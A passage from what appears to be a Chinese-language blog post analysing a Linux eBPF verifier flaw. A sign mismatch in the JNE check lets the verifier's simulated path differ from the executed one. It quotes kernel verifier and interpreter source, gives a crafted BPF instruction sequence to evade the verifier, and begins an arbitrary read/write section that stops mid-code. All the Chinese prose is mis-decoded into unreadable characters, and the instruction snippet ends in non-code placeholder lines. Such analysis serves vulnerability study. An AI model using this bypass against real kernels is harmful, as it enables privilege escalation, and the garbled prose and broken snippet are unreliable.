&#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">				 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">				 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">				 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">				 * something into it earlier</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    process_bpf_exit:</span><br><span class="line">    insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      do_print_state = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åçš„elseè¯­å¥ä¹Ÿå°±æ˜¯JNEæ‰€è¿›å…¥çš„åˆ†æ”¯ï¼Œæ‰€ä»¥ä¼šè¿›ä¸€æ­¥è¿›å…¥<code>check_cond_jmp_op</code>å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">    <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">    *insn_idx += insn-&gt;off;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">			 * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å‡½æ•°å†…éƒ¨å­˜åœ¨è¿™æ ·ä¸€æ¡ifè¯­å¥ï¼Œç”±å‰é¢æåˆ°äº†åœ¨<code>reg_state</code>ç»“æ„ä½“ä¸­çš„immå’Œ<code>insn</code>ä¸­çš„imméƒ½æ˜¯intç±»å‹ï¼Œå¹¶ä¸”<code>reg_state</code>ç»“æ„ä½“ä¸­çš„immæ˜¯ç”±<code>insn</code>ä¸­ç›´æ¥èµ‹å€¼è¿‡å»çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ¡ä»¶ä¼šæ’ç­‰ã€‚æ‰€ä»¥å½“æ“ä½œç ä¸º<code>BPF_JNE</code>æ—¶ï¼Œæ°¸è¿œéƒ½ä¸ä¼šè·³è½¬ã€‚</p>
<p>ä¸Šé¢æ˜¯æ¨¡æ‹Ÿæ‰§è¡Œçš„æƒ…å†µï¼Œé‚£ä¹ˆä¸‹é¢çœ‹çœ‹çœŸå®æ‰§è¡Œæƒ…å†µæ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œé¦–å…ˆçœŸå®æ‰§è¡Œæƒ…å†µçš„å‡½æ•°ä¸º<code>__bpf_prog_run</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">	u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">	u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">		[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">		<span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line">		<span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">		[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">		[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">		[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">		[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">		[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">		[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">		[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">		[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">		[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">		[BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">		[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">		[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">		[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å‡½æ•°è¿™é‡Œç»´æŠ¤çš„æ˜¯ä¸€ä¸ªè·³è¡¨ï¼Œæ ¹æ®opcodeæ¥è¿›è¡Œè·³è½¬ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•æ£€æµ‹ã€‚è¿™é‡Œé‡ç‚¹å…³æ³¨ä¸€ä¸‹ä¸Šè¿°ä¾‹å­ä¸­çš„è·³è½¬å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Jumps */</span></span><br><span class="line">[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œèµ‹å€¼çš„æ˜¯<code>JMP_JNE_K</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">  insn += insn-&gt;off;</span><br><span class="line">  CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ¯”è¾ƒå…³æ³¨DSTå’ŒIMMçš„å®šä¹‰äº†ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Named registers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DST	regs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRC	regs[insn-&gt;src_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FP	regs[BPF_REG_FP]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARG1	regs[BPF_REG_ARG1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CTX	regs[BPF_REG_CTX]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMM	insn-&gt;imm</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡ŒIMMçš„å®šä¹‰ä¾æ—§æ˜¯ä»insnä¸­æ‹¿å‡ºæ¥çš„ï¼Œç„¶è€Œè¿™é‡Œçš„DSTæ˜¯ç›´æ¥ä»çº¦å®šçš„å¯„å­˜å™¨ä¸­æ‹¿å‡ºæ¥ï¼Œç„¶è€Œåœ¨<code>__bpf_prog_run</code>å‡½æ•°çš„å¼€å¤´å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„å¯„å­˜å™¨å®šä¹‰ä¸º<code>unsigned long long int</code>ç±»å‹ï¼Œé‚£ä¹ˆå¦‚æœé‡æ–°æ‰§è¡Œä¸Šè¿°æ¼”ç¤ºä»£ç å°±ä¼šå‡ºç°è·³è½¬ï¼Œä¹Ÿå°±æ˜¯è¯´æ£€æŸ¥å’Œå®é™…è¿è¡Œçš„æŒ‡ä»¤æ‰§è¡Œæµç¨‹ä¼šä¸ä¸€è‡´ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç»•è¿‡å®‰å…¨æ£€æµ‹ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="é€€å‡ºdo-check"><a href="#é€€å‡ºdo-check" class="headerlink" title="é€€å‡ºdo_check"></a>é€€å‡º<code>do_check</code></h3><p>ä½†å°±ç›®å‰æ¥çœ‹ä¾æ—§å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯è™½ç„¶ä»–ä¼šè¿›å…¥<code>BPF_EXIT</code>åˆ†æ”¯ï¼Œä½†æ˜¯åœ¨æœ€åçš„pop_stackéœ€è¦è¿”å›çš„å€¼ä¸ºè´Ÿæ•°æ‰èƒ½ç»“æŸå¾ªç¯é€€å‡º<code>do_check</code>å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">  <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">      insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">      insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">      insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">				 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">				 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">				 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">				 * something into it earlier</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EACCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process_bpf_exit:</span><br><span class="line">  insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">  <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_print_state = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">	insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line">	<span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">		*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">	elem = env-&gt;head-&gt;next;</span><br><span class="line">	kfree(env-&gt;head);</span><br><span class="line">	env-&gt;head = elem;</span><br><span class="line">	env-&gt;stack_size--;</span><br><span class="line">	<span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span>		<span class="comment">/* eBPF program being verified */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">head</span>;</span> <span class="comment">/* stack of verifier states to be processed */</span></span><br><span class="line">	<span class="keyword">int</span> stack_size;			<span class="comment">/* number of states to be processed */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> <span class="title">cur_state</span>;</span> <span class="comment">/* current verifier state */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state_list</span> **<span class="title">explored_states</span>;</span> <span class="comment">/* search pruning optimization */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">used_maps</span>[<span class="title">MAX_USED_MAPS</span>];</span> <span class="comment">/* array of map&#x27;s used by eBPF program */</span></span><br><span class="line">	u32 used_map_cnt;		<span class="comment">/* number of used maps */</span></span><br><span class="line">	<span class="keyword">bool</span> allow_ptr_leaks;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬åœ¨å®ç°æ„é€ æ—¶éœ€è¦å°†headä½ç½®ä¸º0ï¼Œæ ¹æ®å‡½æ•°å<code>pop_stack</code>å¯ä»¥æ¨æµ‹å‡ºæ¥è¿™é‡Œå…¶å®ä¹Ÿå°±æ˜¯æ ˆçš„æ“ä½œï¼Œæ‰€ä»¥å¤§è‡´çš„æ„é€ æ–¹æ³•æ˜¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN(),</span><br><span class="line">option,</span><br><span class="line">pandding == <span class="number">0</span>,</span><br><span class="line">options</span><br></pre></td></tr></table></figure>

<h3 id="å®ç°ä»»æ„åœ°å€è¯»å†™"><a href="#å®ç°ä»»æ„åœ°å€è¯»å†™" class="headerlink" title="å®ç°ä»»æ„åœ°å€è¯»å†™"></a>å®ç°ä»»æ„åœ°å€è¯»å†™</h3><p>å†…å­˜è¯»å†™éœ€è¦ç”¨åˆ°çš„æŒ‡ä»¤ä¸»è¦æ˜¯BPF_LDX_MEMæˆ–è€…BPF_STX_MEMä¸¤ç±»ã€‚å¦‚ä¸‹ï¼Œå½“r7å’Œr8çš„å€¼å¯æ§å°±å¯ä»¥è¾¾åˆ°å†…å­˜ä»»æ„å†™ï¼Œç±»ä¼¼äºmov dword ptr[r7],r8è¿™æ ·çš„æ“ä½œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment">			 * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                         insn-&gt;dst_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment">				 * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment">				 * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">    insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment">				 * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment">				 * with different pointer types:</span></span><br><span class="line"><span class="comment">				 * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment">				 * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment">				 * Reject it.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">    err = check_xadd(env, insn);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src1 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  <span class="comment">/* check src2 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;dst_reg, 